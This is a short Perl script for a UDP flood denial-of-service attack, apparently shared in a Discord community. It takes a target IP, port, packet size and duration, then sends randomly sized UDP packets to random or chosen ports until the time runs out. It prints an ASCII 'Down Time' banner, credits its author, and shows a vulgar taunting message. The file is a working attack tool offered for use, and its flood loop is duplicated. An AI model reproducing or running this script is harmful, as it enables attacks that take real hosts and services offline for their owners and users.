#!/usr/bin/perl

##
#!/usr/bin/perl

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);


print <<EOTEXT;


8888888b.                                  88888888888 d8b                           Script made by Reaper. on discord
888  "Y88b                                     888     Y8P
888    888                                     888
888    888  .d88b.  888  888  888 88888b.      888     888 88888b.d88b.   .d88b.
888    888 d88""88b 888  888  888 888 "88b     888     888 888 "888 "88b d8P  Y8b
888    888 888  888 888  888  888 888  888     888     888 888  888  888 88888888
888  .d88P Y88..88P Y88b 888 d88P 888  888     888     888 888  888  888 Y8b.
8888888P"   "Y88P"   "Y8888888P"  888  888     888     888 888  888  888  "Y8888
               
EOTEXT

print "Your Moms Dildo Just Fucked Your Man: $ip " . ($port ? $port : "random") . " With " .
($size ? "$size-byte" : "Smacked With A Large Packets?") . " " .
($time ? "for $time seconds" : "") . "\n";

for (;time() <= $endtime;) {
$psize = $size ? $size : int(rand(1024-64)+64) ;
$pport = $port ? $port : int(rand(65500))+1;

send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}for (;time() <= $endtime;) {
$psize = $size ? $size : int(rand(1024-64)+64) ;
$pport = $port ? $port : int(rand(65500))+1;

send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}